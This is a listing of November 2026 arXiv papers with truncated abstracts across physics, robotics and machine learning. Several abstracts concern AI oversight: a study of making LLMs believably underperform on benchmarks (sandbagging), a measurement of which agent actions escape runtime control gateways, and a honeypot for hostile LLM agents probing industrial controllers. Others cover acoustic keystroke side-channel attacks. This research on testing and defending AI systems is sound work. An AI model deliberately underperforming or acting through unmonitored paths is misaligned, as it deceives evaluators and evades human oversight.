- **2026-11-11** — Emily Z. Zhang, Thomas P. Devereaux — [What Hall Measures in Strongly Correlated Metals](http://arxiv.org/abs/2611.15940v1)
  <details><summary>📄 Abstract</summary>
  The Hall effect provides a sensitive probe of electronic correlations in strongly interacting metals, yet its microscopic interpretation beyond quasiparticle transport remains poorly understood. Here, we develop a Liouvillian formulation of the Hall conductivity that organizes the response into different classes of flux-sensitive many-body interference operators. Using a Schrieffer-Wolff transformation of the Hubbard model, we identify how projected charge motion and virtual hopping processes co...
  </details>

- **2026-11-11** — Duncan J. Bowden, Tian Li, Aprajita Verma et al. — [Can we constrain cosmology with compound gravitational lenses?](http://arxiv.org/abs/2611.15714v1)
  <details><summary>📄 Abstract</summary>
  Compound lensing in double-source-plane lenses (DSPLs) introduces multiple mass-sheet transformations that bias the inferred distance ratios $β$ used to constrain cosmology. We present the recovered $β$ from lens models of simulated compound lenses and explore the systematic biases that arise from a mass-sheet transformation in the first source plane. We examined simulated observations based on SDSS J0946+1006, in which we varied the matter distribution of source 1. We found a strong correlation...
  </details>

- **2026-11-11** — Jingyan Jiang, Akhilesh Bondapalli, Krishna Rauniyar et al. — [AskALCF: A Self-Improving Agentic System for Intelligent HPC User Support](http://arxiv.org/abs/2611.15700v1)
  <details><summary>📄 Abstract</summary>
  AI-based question-answering systems are increasingly used for user support, including at high-performance computing (HPC) facilities. However, existing systems lack a systematic, deployment-oriented approach for evaluating final-answer quality and attributing failures to specific components. They also remain largely static after deployment, apart from periodic knowledge-base updates.   We present AskALCF, an agentic log-analysis and improvement pipeline for HPC user support. AskALCF evaluates pr...
  </details>

- **2026-11-11** — Zenghui Yang, Xinan Wang, Danyang Li et al. — [EMS-Nav: Embodied Multi-Scale Navigation](http://arxiv.org/abs/2611.15589v1)
  <details><summary>📄 Abstract</summary>
  Industrial inspection robots must reach work areas and specific equipment. These destinations span spatial scales from regions to objects, so robots must relate each target to its surroundings to interpret the task and determine where to go. Existing methods support multi-scale navigation through rich environment representations, but at substantial computational and storage cost. These costs limit deployment where wireless coverage is incomplete and robots must rely on onboard computation to kee...
  </details>

- **2026-11-11** — Chengguang Gan, Yunhao Liang, Hanjun Wei et al. — [Can We Make an LLM Dumber, or Is It Just Playing Dumb? An Empirical Study of Believable Performance Throttling](http://arxiv.org/abs/2611.15568v1)
  <details><summary>📄 Abstract</summary>
  A benchmark score is commonly read as a proxy for model capability. We study the inverse problem: can a model be driven to a target score, and do its failures resemble those of a naturally weaker model? We operationalize believable performance reduction along three axes: target calibration, item-difficulty structure, and error-distribution similarity to a real weak reference. We introduce CapLadder, an IRT-calibrated suite of 1,985 items spanning mathematics, code, multiple-choice reasoning, and...
  </details>

- **2026-11-11** — Fabian Jenelten, Deepana Ishtaweera, Pablo Garcia et al. — [Autonomous Trail Racing with a Bicycle Robot](http://arxiv.org/abs/2611.15280v1)
  <details><summary>📄 Abstract</summary>
  Navigating off-road trails on a mountain bike requires diverse locomotion skills, including aerial maneuvers, cornering, and slip recovery, paired with sophisticated perception for scene understanding. Translating these capabilities to autonomous, two-wheeled robots remains a formidable challenge. We show that autonomous, high-speed trail navigation can be achieved through a single idea: encoding the trail as a semantic layer of the terrain. In simulation, this layer embeds the navigation task i...
  </details>

- **2026-11-11** — Gaurav Sarkar, Umang Pandey, Pratik Prabhanjan Brahma et al. — [Schedule-Calibrated Commitment Order in Blockwise Masked Diffusion Language Models](http://arxiv.org/abs/2611.15234v1)
  <details><summary>📄 Abstract</summary>
  Sequential block schedules can make token commitment in masked diffusion language models appear strongly left-to-right even when within-block order is random or reversed. For equal contiguous blocks processed without interleaving in positional order, with untied irreversible commitments, we use a Spearman-rank identity to express global position-commitment correlation as a deterministic schedule reference plus a weighted mean within-block correlation. In a reported paired study of LLaDA-8B-Instr...
  </details>

- **2026-11-11** — Jinlong Hu, Shixu Fan, Chongzhang Li — [DGPExplainer: Generating Prototype Sequence Explanations for Dynamic Graph Neural Networks](http://arxiv.org/abs/2611.15224v1)
  <details><summary>📄 Abstract</summary>
  Graph Neural Networks (GNNs) have been successfully applied to learning from graph-structured data. However, applying them to dynamic graphs-where nodes and edges evolve over time-presents significant challenges, particularly regarding explainability. While explanation techniques for static GNNs are well established, they do not readily extend to dynamic GNNs (DGNNs) due to the added complexity introduced by temporal dynamics and spatiotemporal dependencies, especially when generating model-leve...
  </details>

- **2026-11-11** — Kentaroh Toyoda, Alex Leung, Bhuvaneswari U — [guardscope: Measuring Which Actions Runtime Controls Check in LLM Agent Systems](http://arxiv.org/abs/2611.15223v1)
  <details><summary>📄 Abstract</summary>
  Large-language model (LLM) agents execute actions on external systems through tool calls, and enterprises deploy runtime controls, such as agent gateways, to check this behavior in real time. However, a control can only evaluate the actions that cross the point where it is placed, and an agent can act through more paths than the tool-call channel; no existing work measures this coverage against kernel-level ground truth. In this paper, we present guardscope, a framework that makes this coverage ...
  </details>

- **2026-11-11** — Tristan Lim, Haoxin Tu, Mehtab Zafar et al. — [Pre-QED: Environment Specifications for Agentic Verification](http://arxiv.org/abs/2611.15207v1)
  <details><summary>📄 Abstract</summary>
  LLM agents are making formal verification practical at scale. Recently, many attempts have raised this as an enticing possibility. However, formal verification at scale is only meaningful if deep formal specifications capturing functionality are available for checking. Unfortunately, recent works seek to bypass this issue by using shallow specifications devised for purposes other than verification. OSS-Verify from Anthropic and Theorem, for example, reuses the fuzz harnesses of open-source libra...
  </details>

- **2026-11-11** — Jiayu Ding, Yupan Huang, Jinyoung Park et al. — [WordInferBench: Can Agents Infer How to Edit from Word Document Context?](http://arxiv.org/abs/2611.15189v1)
  <details><summary>📄 Abstract</summary>
  Document editing is among the most common knowledge-work tasks, yet existing benchmarks for evaluating autonomous agents on Word document editing provide fully specified attribute-modification instructions. They do not evaluate agents' ability to infer the appropriate attributes from document context, a capability essential in real-world editing where users expect consistency without spelling out every attribute. We introduce WordInferBench, a benchmark comprising 280 base document-editing insta...
  </details>

- **2026-11-11** — Zengji Tu, Xiang Liu, Jiarui Sun et al. — [Science Prediction Universe](http://arxiv.org/abs/2611.15049v1)
  <details><summary>📄 Abstract</summary>
  Humanity has long sought to explain natural phenomena. Reliable prediction of experimental outcomes is a central test of our understanding of the processes that produce them. If artificial general intelligence (AGI) is to surpass human scientific capabilities, it must also predict experimental outcomes more reliably than humans. Such capabilities could accelerate scientific discovery across disciplines, help address humanity's most pressing challenges, and improve human well-being. We introduce ...
  </details>

- **2026-11-11** — Shi Chen, Seoyoung Ahn, Doris Tsao — [Prototypes of the Mind: A Unified Framework for Probing the Visual Brain](http://arxiv.org/abs/2611.15046v1)
  <details><summary>📄 Abstract</summary>
  Deep learning has driven substantial progress in modeling fMRI responses, yet most existing approaches are optimized for a single objective---such as neural encoding, stimulus decoding, or post hoc interpretation---making it difficult to obtain a coherent account of neural representations. We introduce a unified framework that connects vision foundation models to brain activity while supporting neural analysis from multiple complementary perspectives. Our approach replaces black-box features wit...
  </details>

- **2026-11-11** — Ge Fan, Kai Wang, Chaoyun Zhang et al. — [SkinAdvisor: An AI-Driven Decision Framework for Skin Production Planning via Multi-Modal Transformer Sales Forecasting](http://arxiv.org/abs/2611.15023v1)
  <details><summary>📄 Abstract</summary>
  Skins, cosmetic in-game items, are a primary revenue stream for modern online games, yet production decisions (which skins to make, when to release, how to price) remain driven by intuition and retrospective analytics. We present SkinAdvisor, an AI-driven decision framework for skin production planning, powered by SkinCast, a deployed multi-modal Transformer forecasting 180-day per-day sales trajectories for unreleased skins. SkinCast couples four encoders: a pretrained Informer for player-prefe...
  </details>

- **2026-11-11** — Jiayang Tu, Bojun Du, Jijun Shui et al. — [TDMOpt: LLM-Driven Cross-layer Dispatch for Transmission-Distribution-Microgrid Systems](http://arxiv.org/abs/2611.15012v1)
  <details><summary>📄 Abstract</summary>
  Coordinating transmission networks, distribution networks, and microgrids enables distributed flexibility to support renewable energy integration and low-carbon operation. However, heterogeneous resources, cross-layer coupling, and varying operating requirements complicate the selection of models and coordination schemes that are both physically adequate and computationally tractable. This paper proposes TDMOpt, a LLM-driven multi-agent framework that replaces fixed modeling configurations with ...
  </details>

- **2026-11-11** — Haoyang Zhang, Qumeng Sun, Xiao Zhang et al. — [EvoX: Rethinking the Agent Harness as a Runtime Policy](http://arxiv.org/abs/2611.15006v1)
  <details><summary>📄 Abstract</summary>
  Large language model (LLM) agents increasingly interact with tools and environments, yet plausible model decisions do not always translate into successful execution due to tool-call mismatches, interrupted workflows, and unsupported completion claims. We present EvoX, a Rust-based, multi-model agent runtime guided by The Second Policy, which views the harness as an Operational Policy complementing the foundation model's Semantic Policy. EvoX combines model-facing guidance with deterministic runt...
  </details>

- **2026-11-11** — Peng Liang, Genan Dai, Bowen Zhang — [EASTAR: Event-Anchored Semantic and Task-Adaptive Region Representation Learning](http://arxiv.org/abs/2611.14990v1)
  <details><summary>📄 Abstract</summary>
  Urban region representation learning supports a wide range of urban analytics tasks by encoding regional functions and interactions, with human mobility serving as a central signal because it directly captures inter-region interactions. However, most mobility-based methods learn from aggregated origin-destination matrices, where trips driven by different activity purposes are mixed into purpose-agnostic interaction patterns. Although static urban attributes such as POIs and land use can enrich r...
  </details>

- **2026-11-11** — Yue Zhou, Jiawei Liu, Jue Chen et al. — [RSLiveBench-UAV: A Continually Evolving Vision-Language Benchmark for Aerial Spatial Intelligence](http://arxiv.org/abs/2611.14953v1)
  <details><summary>📄 Abstract</summary>
  Aerial spatial intelligence (ASI) requires models to understand objects and spatial relationships across changing viewpoints and scales. Evaluating these abilities as models evolve calls for fresh physical observations, yet producing new aerial spatial questions requires repeatedly establishing entity identities, geometric references, and cross-view correspondences. We introduce \textbf{RSLiveBench-UAV}, a continually evolving vision-language benchmark driven by recurring acquisition of real UAV...
  </details>

- **2026-11-11** — Y. E. Geints, L. V. Seleznev, G. E. Rizaev et al. — [Effect of Gas Pressure and Molecular Structure in the Spatial-Mode Conversion of Terahertz Radiation from a Plasma Filament](http://arxiv.org/abs/2611.14939v1)
  <details><summary>📄 Abstract</summary>
  In this work, the generation of terahertz (THz) radiation under single color filamentation of a femtosecond laser pulse in an optical cell with compressed gases (argon, nitrogen, CO2) in broad pressure range from 0.001 to 25 atm is experimentally studied for the first time. A nonmonotonic dependence of the integral energy of the THz signal on the gas pressure is revealed, which can be attributed to the competition between an increase in the plasma density and the development of plasma selfabsorp...
  </details>

- **2026-11-11** — Richard J. Young, Alice M. Matthews — [Do Large Language Models Show Racial and Sex Bias in Pain Management? A Counterfactual Audit of GPT, Claude, Gemini, Llama, DeepSeek and Qwen](http://arxiv.org/abs/2611.14935v1)
  <details><summary>📄 Abstract</summary>
  Racial and ethnic minority patients receive less pain treatment than non-Hispanic White patients, and large language models (LLMs) used as medical AI could reproduce that bias. Prior audits tested a few proprietary models, stated race explicitly and rarely measured the models' own response instability. In exploratory, non-preregistered analyses, Study 1 had four open-weight LLMs assess six acute-pain vignettes in every combination of four races and two sexes, with identity stated or cued only by...
  </details>

- **2026-11-10** — Vagn Krister Nes Glomsrud, Mathias Bynke, Lars Henry Berge Olsen et al. — [Accurate predictions of properties of energetic materials with tabular foundation models](http://arxiv.org/abs/2611.14462v2)
  <details><summary>📄 Abstract</summary>
  We use TabPFN, a recently developed tabular foundation model, to predict three properties of energetic materials: impact sensitivity, decomposition temperature and crystal density. Without any hyperparameter tuning, TabPFN outperforms the best published models for all three properties. It also substantially outperforms a wide range of established machine-learning models, including tuned gradient boosting (XGBoost), random forests and Gaussian processes. This holds both when the models are given ...
  </details>

- **2026-11-10** — Yuliang Ding, Marco Velli, Chen Shi et al. — [Turbulence Properties of Corotating Interaction Regions at 1 AU: a Comprehensive Superposed Epoch Analysis](http://arxiv.org/abs/2611.14779v1)
  <details><summary>📄 Abstract</summary>
  We perform a comprehensive superposed epoch analysis (SEA) of more than 200 corotating interaction regions (CIRs) using WIND spacecraft observations at 1 AU. The stream interfaces are identified by Minimum Variance Analysis (MVA), and turbulence properties are evaluated using wavelet transforms over a wide range of temporal scales. The analysis of normalized cross helicity ($σ_c$) and normalized residual energy ($σ_r$) reveals distinct turbulence behaviors across frequencies. The spectral indice...
  </details>

- **2026-11-10** — Matteo Gabburo, Daniela Baiamonte, Stefano Simonazzi et al. — [Benchmarking Multilingual Document Understanding in Vision-Language Models](http://arxiv.org/abs/2611.14758v1)
  <details><summary>📄 Abstract</summary>
  Recent Vision-Language Models (VLMs) perform strongly on multimodal tasks, Document Understanding (DU) among them, but the benchmarks that measure them mostly cover English documents and narrow problems. How well current VLMs generalize across languages, tasks, styles and layouts therefore remains unclear. We introduce MDU, a multilingual DU benchmark of 23146 examples spanning 13 tasks and five languages: English, French, German, Italian, and Spanish. The tasks isolate complementary capabilitie...
  </details>

- **2026-11-10** — Nhi Nguyen, Shauli Ravfogel, Rajesh Ranganath — [Code as Explanations: Executable and Verifiable LLM Explanations](http://arxiv.org/abs/2611.14704v1)
  <details><summary>📄 Abstract</summary>
  As large language models (LLMs) increasingly make consequential decisions and solve problems alongside humans, we must understand how models arrive at their conclusions. Understanding how an LLM behaves requires observing it across multiple inputs, yet free-text explanations such as chain-of-thought (CoT) are generated per instance and cannot be easily verified on new inputs. We propose {code explanations to address the mismatch in how LLM explanations are generated versus how they are evaluated...
  </details>

- **2026-11-10** — Mohammad Zarei, Amirhossein MohammadpourAzari, Moslem Habibi — [Conformal Risk Certificates for Portfolio Optimization Under Uncertainty: A Gated Reinforcement-Learning Approach](http://arxiv.org/abs/2611.14699v1)
  <details><summary>📄 Abstract</summary>
  Reinforcement-learning portfolio policies can optimize allocations from prices, covariances, and prior positions, yet they lack a calibrated, replayable mechanism for certifying that a proposed allocation respects a bounded risk envelope before execution. Regulators increasingly expect automated portfolio systems to provide exactly this kind of pre-trade audit trail, interpretable risk limit, and human-oversight mechanism. Gated Conformal Semantic Risk Control addresses this gap by separating re...
  </details>

- **2026-11-10** — Kayshav Bhardwaj, Pragun Seth, Kush Bhardwaj et al. — [MITRA-Swarm: Injecting Explicit Linguistic Structure into Foundation Models for Classical Machine Translation](http://arxiv.org/abs/2611.14675v1)
  <details><summary>📄 Abstract</summary>
  Classical Sanskrit poses three challenges unresolved by single-call monolithic models: morphophonemic fusion Sandhi, dense nominal compounding Samāsa, and discourse-level zero-anaphora forced by poetic meter. We present MITRA-Swarm, a multi-agent architecture injecting explicit linguistic structure into an otherwise monolithic pipeline: a Sandhi-splitting agent, a parallel array of generalist gemma-4-26B-A4B-it and domain-specialized gemma-2-mitra-it translators, and a discourse-aware Ellipsis R...
  </details>

- **2026-11-10** — Shengzhou Kong — [Omni-JEV: Text and Dual-Stream Speech Decisions](http://arxiv.org/abs/2611.13777v2)
  <details><summary>📄 Abstract</summary>
  A user utterance does not uniquely determine the next action in full-duplex dialogue: its consequences depend on the assistant's response state and interaction history. Speech activity, utterance completion, and interruption intent provide related evidence, whose implications for a response require an explicit action policy. We formulate this task at collected-segment endpoints and introduce Omni-JEV, which maps text or role-indexed user and assistant-reference speech to probabilities over five ...
  </details>

- **2026-11-10** — Serhii Zabolotnii, Alina Tarasova — [An AI Assistant for Automating Anti-Corruption Expertise of Draft Legislation Based on the TRACE Framework](http://arxiv.org/abs/2611.14244v2)
  <details><summary>📄 Abstract</summary>
  We present an AI assistant for automating anti-corruption expertise of draft legislation based on the TRACE architecture, designed to screen bills for corruption risks: pinpoint provisions an expert would criticise and name the regulatory defect in each. The pipeline combines a deterministic parsing core, model-guided single-provision qualification, rule-based factor assignment, and external human oversight. To evaluate the assistant, we constructed an open benchmark from the published conclusio...
  </details>

- **2026-11-10** — Igor Sadalski, Minghao Guo, Benjamin Jones et al. — [AutoAssumption: Searching over Assumptions Discovers ML-Systems Algorithms](http://arxiv.org/abs/2611.14844v1)
  <details><summary>📄 Abstract</summary>
  Many advances in ML systems came from breaking an assumption that earlier methods took for granted: speculative decoding dropped the assumption that a model needs one forward pass per token. Yet algorithms rarely state their assumptions, so experts and discovery harnesses search over programs, where one edit changes several design choices and gains are difficult to attribute. Searching over the assumptions themselves remains largely unexplored. Writing algorithms as proofs makes their assumption...
  </details>

- **2026-11-10** — Xiulin Yang, Sirisha Gudavalli, Jennifer Hu — [Rational Use of Time for Social Coordination in Humans and AI](http://arxiv.org/abs/2611.14766v1)
  <details><summary>📄 Abstract</summary>
  All social interactions are situated in time. Previous studies have shown that humans are able to use implicit temporal cues, such as the duration of a pause, to infer others' mental states. But how do humans use temporal cues for dynamic, fine-grained social coordination? And can AI systems do the same, without ``experiencing'' continuous real-time as humans do? We study these questions using a cooperative card game task called The Mind, which requires players to achieve a shared goal across re...
  </details>

- **2026-11-10** — Noy Cohen-Shapira — [Beyond Foreign-Key Connectivity: Semantic Relationship Representation for Relational Deep Learning](http://arxiv.org/abs/2611.14706v1)
  <details><summary>📄 Abstract</summary>
  Relational databases encode information through tables and primary--foreign key constraints. Although recent Relational Deep Learning (RDL) approaches represent these databases as heterogeneous graphs, a foreign-key connection primarily specifies structural connectivity between records. Its semantic interpretation may involve additional information that is not explicitly represented by connectivity alone.   This paper introduces a conceptual framework for constructing relationship-aware represen...
  </details>

- **2026-11-10** — Sivasuthan Sukumar, Uthayasanker Thayasivam — [What Entropy-Based View Selection Cannot See: An Audit of Test-Time Adaptation for Vision-Language Models](http://arxiv.org/abs/2611.14686v1)
  <details><summary>📄 Abstract</summary>
  Vision-language models such as CLIP can classify images into categories they were never explicitly trained to recognize, but accuracy degrades when test images differ in style or source from their training data. A common remedy generates randomly cropped and flipped copies of each test image, called views, and combines their predictions. Since some views miss the object, methods must identify which views to trust. The dominant approach uses prediction entropy to measure confidence and retains th...
  </details>

- **2026-11-10** — Rohit S. Chandramouli, Nijaid Arredondo, Lidia J. Gomes Da Silva et al. — [Post-adiabatic effects sourced by radiation reaction for inspiraling, eccentric binaries in post-Newtonian theory](http://arxiv.org/abs/2611.14627v1)
  <details><summary>📄 Abstract</summary>
  The adiabatic approximation, in which eccentric binaries evolve under orbit-averaged fluxes, is widely used in gravitational-wave and astrophysical modeling. We use resummed multiple-scale analysis, which is closely related to near-identity averaging transformations, to derive post-adiabatic corrections from leading-order radiation reaction and explain how the accuracy of the adiabatic approximation depends on the initial orbital phase. While the secular evolution equations for the eccentricity ...
  </details>

- **2026-11-10** — Ferran Espuny-Pujol — [Measuring Kaplan--Meier Overestimation Under Competing Risks: Event Ordering, Quantification, and Exact Inference](http://arxiv.org/abs/2611.14457v2)
  <details><summary>📄 Abstract</summary>
  Competing risks arise when individuals may experience multiple mutually exclusive event types. Competing events are frequently treated as censoring and analysed using Kaplan--Meier (KM) methods, which overestimate real-world event risks. While the existence of KM overestimation is well known, its determinants, magnitude, and inferential properties remain poorly characterised.   We develop a nonparametric framework that treats competing risks overestimation as a statistical quantity in its own ri...
  </details>

- **2026-11-10** — Thi Dinh Tran, Maria Teresa Rossi, Ludovico Iovino et al. — [Discovering the Relation Between Architectural Models and Reference Architectures](http://arxiv.org/abs/2611.14606v1)
  <details><summary>📄 Abstract</summary>
  Assessing whether concrete software architectures are consistent with their reference architecture (RA) is essential to ensure that architectural decisions scale coherently across projects, preserving the quality attributes the RA was designed to guarantee. In the absence of dedicated techniques, mapping the components of an architectural model onto a predefined RA can be addressed only with general-purpose model-comparison algorithms. Our experiments show that these algorithms are inaccurate wh...
  </details>

- **2026-11-10** — Tushar Tyagi, Aditya Raghavan, Haoran Qiu et al. — [VASTRA: Efficient Agentic Top-K Interactive Video Analysis](http://arxiv.org/abs/2611.14601v1)
  <details><summary>📄 Abstract</summary>
  Vision-language models (VLMs) enable natural language video retrieval, bypassing traditional hand-engineered pipelines. Integrating agentic reasoning frameworks (e.g., ReAct) further advances this paradigm by allowing models to dynamically inspect video content rather than relying on a single visual pass. Applying this pattern naively to video retrieval inherits problems that video systems cannot afford: results vary from run to run under identical conditions, and cost and latency scale with eve...
  </details>

- **2026-11-10** — Tanishq Rachamalla, Srishti Kaushik, Muhammad Attique Khan et al. — [RS-JEPA: Remote Sensing Joint-Embedding Predictive Architecture with Scan-Path Views for Cross-Sensor Image Retrieval](http://arxiv.org/abs/2611.14496v1)
  <details><summary>📄 Abstract</summary>
  Cross-sensor remote sensing image retrieval aims to find scenes with the same content across heterogeneous sensors, such as SAR and optical or panchromatic (PAN) and multispectral (MS) imagery, without manual labels. Existing self-supervised methods either reconstruct sensor-specific pixel detail, align each image only with its co-registered twin, or rely on large transformers with 118-173M parameters (and up to 398M). We introduce RS-JEPA, a compact joint-embedding predictive framework built on...
  </details>

- **2026-11-10** — Bikrant Bikram Pratap Maurya — [Domain-Invariant and Language-Model-Assisted Acoustic Side-Channel Attacks on Keyboards](http://arxiv.org/abs/2611.13922v1)
  <details><summary>📄 Abstract</summary>
  Acoustic side-channel attacks (ASCA) recover typed text from the sound of keystrokes, using only a commodity microphone and no access to the victim's device. Prior work establishes that such attacks succeed under idealized laboratory conditions - a single keyboard, a fixed microphone, a quiet room, and training and testing on the same device but leaves open the question that matters for security: whether keystroke inference survives the open world of unseen keyboards, diverse users, noisy enviro...
  </details>

- **2026-11-10** — Canyon Grey Dell'Omo, Joao Pedro de Carvalho Voltani — [Stinging the Swarm: Extracting Attacker Intelligence from a Twin-Controller OT Honeypot](http://arxiv.org/abs/2611.13406v1)
  <details><summary>📄 Abstract</summary>
  Autonomous language-model agents can drive industrial controllers over fieldbus protocols, probing a plant at machine speed and in coordinated swarms. We present Talos, an inline gate that judges every agent request to a controller in milliseconds and routes agents it flags as hostile to a device-faithful decoy -- a mirror twin of the real plant -- where their attack continues harmlessly and is read for intelligence. We evaluate the full pipeline (detect -> quarantine -> mirror -> extract) again...
  </details>

- **2026-11-10** — Guorui Lu, Qinyu Chen — [C$^2$-Routing: Complementary Cropping and Compression for Efficient Vision-Language Inference](http://arxiv.org/abs/2611.14469v1)
  <details><summary>📄 Abstract</summary>
  Visual Question Answering (VQA) imposes substantial computational overhead on vision-language models (VLMs), motivating model-agnostic input reduction methods that can be readily applied across diverse VLMs, including in black-box settings. Simply enforcing a visual-token cap reduces computation, but it can discard information needed to answer the question. A single reduction strategy also struggles to accommodate different scenarios. Our key observation is that cropping and compression are comp...
  </details>

- **2026-11-10** — Souhaila Djaffal, Amna Jamal, Gagana Madhugiri Devaraja et al. — [Evaluating LLM-Generated World Models for Neuro-Symbolic Reasoning](http://arxiv.org/abs/2611.14419v1)
  <details><summary>📄 Abstract</summary>
  Formal world models can support planning, verification, and safety reasoning, but constructing them from open-ended natural-language situations is difficult, particularly in multi-agent settings where several formalizations may be plausible. We study whether five LLMs can generate such world models as partially observable stochastic games and whether mechanical validity is sufficient to establish that the resulting model faithfully represents the intended decision problem. We introduce a benchma...
  </details>

- **2026-11-10** — Avinash Singh, Manish Saroya, Fatemeh Cheraghi Pouria et al. — [SIGMO: Sigmoid Gated Interaction-Aware Motion Planning](http://arxiv.org/abs/2611.14414v1)
  <details><summary>📄 Abstract</summary>
  Despite the widespread adoption of autonomous vehicle technologies, reliable navigation within cluttered environments remains arduous due to the necessity of interaction-aware strategies; example scenarios include: narrow passages with multiple agents, lane changing in dense traffic, and crossing unsignalized intersections. These scenarios often require highly proactive strategies, simultaneously demanding interpretability and quick adaptability, which challenge end-to-end and data-driven method...
  </details>

- **2026-11-10** — Dong Han, Jin Zhang, Kunyue Yang — [Cognitive Mapping of Learning by Thinking Mechanisms in Large Language Models](http://arxiv.org/abs/2611.14382v1)
  <details><summary>📄 Abstract</summary>
  Large language models (LLMs) increasingly exhibit capabilities that resemble human Learning by Thinking (LbT), the acquisition of new insight through internal processes such as explanation and reasoning, without new external input. A systematic account of the cognitive mechanisms behind these capabilities, and of their limits, remains underdeveloped. This paper proposes a Cognitive LbT Framework that maps four mechanisms (Reflective Reasoning, Synthetic Memory Formation, Internal Simulation, and...
  </details>

- **2026-11-10** — Jiahang Lin, Wanying Ren, Wanghan Xu et al. — [ARE-bench: Benchmarking Agents' Research Ability in Real-World Researcher Sessions and Workspaces](http://arxiv.org/abs/2611.14364v1)
  <details><summary>📄 Abstract</summary>
  Research agents achieve increasingly strong benchmark scores, yet these scores do not necessarily translate into reliable delivery in ongoing research projects. Many research-agent benchmarks emphasize standalone tasks and relatively self-contained workflows in clean or curated workspaces. However, researchers ask agents to complete one step within an ongoing project, where requests depend on earlier session decisions and workspaces contain unfinished files, outdated versions, and failed attempt...
  </details>

- **2026-11-10** — Dominika Maslarova, Mattys Pouyez, Patrik Jansson et al. — [Physics-informed Bayesian optimization of high-order harmonic generation in gases](http://arxiv.org/abs/2611.14119v1)
  <details><summary>📄 Abstract</summary>
  Optimization of high-order harmonic generation in gases is essential for attosecond science. Improving conversion efficiency from the infrared driving laser to the extreme-ultraviolet high-order harmonic radiation requires balancing microscopic single-atom dipole responses with macroscopic phase matching. The resulting conversion-efficiency landscape exhibits complex structures, such as the hyperbolic ridge in the pressure-length space, which can be difficult to accurately reconstruct using conv...
  </details>

- **2026-11-10** — Minyu Zhou, Yajing Wu, Yongqiang Tang et al. — [ScaleBrain: A Scale-Consistent Framework for EEG Foundation Models](http://arxiv.org/abs/2611.14035v1)
  <details><summary>📄 Abstract</summary>
  Foundation models pre-trained on large unlabeled electroencephalography (EEG) corpora have emerged as a transformative paradigm for Brain-Computer Interface (BCI) applications. Recent EEG foundation models have shown that multi-scale representations derived from fixed-length patches can improve EEG representation learning. Existing frameworks commonly construct temporal scales through feature-level operations. However, these operations leave the correspondence between learned features and scale-...
  </details>

- **2026-11-10** — Haotian Qi, Gabriel Skantze — [AVCC: Audio-Visual Conversation Corpus for Turn-Taking Prediction with a Human Benchmark](http://arxiv.org/abs/2611.13957v1)
  <details><summary>📄 Abstract</summary>
  } Predicting who will speak next, and when, is a prerequisite for conversational agents and social robots that take turns without waiting for silence. Multiparty next-speaker prediction (NSP) has been studied on corpora with per-speaker sensors, each with its own event definitions. No public benchmark covers the single camera and microphone a robot has, and no model has been compared against how well people perform the same prediction. We turn AVCC, a 31-hour audio-visual corpus of two- and thre...
  </details>

- **2026-11-10** — Yash Purswani, Shivansh Agarwal, Anuj Tiwari — [Safety and Connectivity Certificates for Finite-Time Formation Transitions](http://arxiv.org/abs/2611.13927v1)
  <details><summary>📄 Abstract</summary>
  Finite-time formation transitions are useful for coordinating multi-agent systems in time-critical missions, but convergence to a prescribed formation in finite time does not guarantee collision avoidance or communication connectivity during the transition. Existing approaches address finite-time coordination and safety-constrained formation control, yet explicit connections between disagreement during transitions, formation geometry, and coupling-gain selection need to be developed for certifyi...
  </details>

- **2026-11-10** — Lianlei Shan, Han Jin, Yaunchao Ma et al. — [Game-Enhanced Embodied Learning with Event and Foresight Pretraining](http://arxiv.org/abs/2611.13819v1)
  <details><summary>📄 Abstract</summary>
  Human gameplay supplies paired observations, actions, and visual consequences that can supplement robot-policy training. We study event-and-foresight pretraining for InternVLA-A1.5, combining recorded keyboard/mouse event prediction with history-conditioned visual supervision through a frozen video model. Coverage-preserving anchor selection constructs one-second targets, and an attention mask prevents teacher-forced future actions from entering foresight queries. The selected corpus contains 39...
  </details>

- **2026-11-10** — Shengzhou Kong — [Omni-JEV: Text and Dual-Stream Speech Decisions](http://arxiv.org/abs/2611.13777v1)
  <details><summary>📄 Abstract</summary>
  A user utterance does not uniquely determine the next action in full-duplex dialogue: its consequences depend on the assistant's response state and interaction history. Speech activity, utterance completion, and interruption intent provide related evidence, whose implications for a response require an explicit action policy. We formulate this task at collected-segment endpoints and introduce Omni-JEV, which maps text or role-indexed user and assistant-reference speech to probabilities over five ...
  </details>

- **2026-11-10** — Saeid Firouzi Daghigh, Saeed Ayat — [From Depth to Safe Depth: Uncertainty-Aware Monocular Perception for Mobile Robot Navigation](http://arxiv.org/abs/2611.13769v1)
  <details><summary>📄 Abstract</summary>
  Monocular depth foundation models make it tempting to replace depth sensors on mobile robots with a single RGB camera. We show that, used off the shelf, this is unsafe: in a simulated indoor navigation benchmark, a standard Nav2 stack driven by Depth Anything V2 (metric) collides in 63\% of 120 episodes, because the model systematically over-estimates the distance to nearby obstacles. We propose a lightweight plug-in module that turns predicted depth into \emph{safe depth}. A 0.58\,M-parameter h...
  </details>

- **2026-11-10** — Yuechun Sun, Jun Yang, Kexin Pei — [Curriculum proof repair with learned counterexamples](http://arxiv.org/abs/2611.13627v1)
  <details><summary>📄 Abstract</summary>
  Language models (LMs) have substantially lowered the barrier to applying formal verification for building reliable and secure software. Existing approaches commonly follow the verifier-in-the-loop paradigm, but the verifier often provides only coarse, binary pass/fail feedback, which offers little actionable signal on how the proof should be repaired. Recent work shows that counterexamples provide more actionable feedback by grounding proof failures in concrete program states, but generating use...
  </details>

- **2026-11-10** — Tiancheng Xu, Wensheng Yu — [Megrez: A Knowledge-Guided Agent for Formal Mathematics over MK Set Theory](http://arxiv.org/abs/2611.13613v1)
  <details><summary>📄 Abstract</summary>
  General-purpose coding agents equipped with proof-assistant tools have shown strong performance on standalone competition problems, yet cumulative textbook formalization inside a low-resource mathematical library still faces three obstacles: aligning textbook concepts with library declarations, keeping long-horizon search synchronized with live proof states, and integrating locally verified proofs reliably into a growing codebase. We present Megrez, a knowledge-guided formalization agent for Roc...
  </details>

- **2026-11-10** — Yuqi Wang, Fengyuan Liu, Mukai Li et al. — [Market-Conditioned JEPA: Learning from Unpredictable Market Shocks](http://arxiv.org/abs/2611.13572v1)
  <details><summary>📄 Abstract</summary>
  Much of the variation in financial time series is driven by market-wide shocks that cannot be predicted from an asset's own history. Per-asset self-supervised learning treats this variation as irreducible noise. Under a latent factor model, we show that conditioning prediction on the realized market factor makes the asset's market exposure necessary for optimal prediction, while reducing the noise against which the asset-specific component is learned. Building on this insight, we introduce Marke...
  </details>

